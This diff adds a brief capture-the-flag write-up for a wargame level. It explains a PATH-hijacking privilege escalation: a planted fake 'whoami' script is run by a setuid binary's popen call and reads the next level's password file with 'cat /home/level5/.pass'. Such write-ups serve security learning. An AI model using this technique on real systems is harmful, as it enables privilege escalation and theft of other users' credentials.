@@ -1,0 +1,14 @@
+First Try!
+`popen(whoami)` searches PATH for the program -> we control PATH!
+we can prepend the path of any dir to which we have write access to PATH
+
+Solution:
+```
+__writable_dir="/tmp/myname$(date --rfc-3339=seconds)"
+mkdir -p "$__writable_dir"
+cd "$__writable_dir"
+echo 'cat /home/level5/.pass' > whoami
+chmod +x whoami
+export PATH=.:$PATH
+/levels/level04
+```
